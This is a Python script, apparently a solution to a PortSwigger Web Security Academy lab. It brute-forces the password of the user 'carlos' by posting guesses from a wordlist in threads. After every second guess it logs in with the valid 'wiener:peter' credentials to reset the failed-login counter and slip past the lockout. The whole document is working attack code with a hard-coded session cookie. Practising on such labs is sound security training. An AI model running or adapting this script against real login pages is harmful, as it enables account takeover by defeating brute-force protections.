import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()
    with open(filename) as file:
        for line in file:
            listPassword.append(line.strip())
    return listPassword

def fetch_send_request(url, cookie, password):
    data = {
        "username": "carlos",
        "password": password
    }
    response = requests.post(url, cookies=cookie, data=data)
    if "Incorrect password" not in response.text:
        print(f"[+] Found Password Of Carlos: {password}")
def send_account_valid(url, cookie):
    login_wiener={
        "username":"wiener",
        "password":"peter"
    }
    requests.post(url, cookies=cookie, data=login_wiener)

def main():
    url = "https://0aad0059043621978291f79f0035006f.web-security-academy.net/login"
    cookie = {"session":"E1JpdZveqt8OkNabZxZSPVmQwQl8HZQr"}
    passwordFilename = "./password.txt"
    listPassword = fetchPassword(passwordFilename)
    count = 0
    for password in listPassword:
        count += 1
        if count == 2:
            count = 0
            send_account_valid(url, cookie)
        thread = Thread(target=fetch_send_request, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == "__main__":
    main()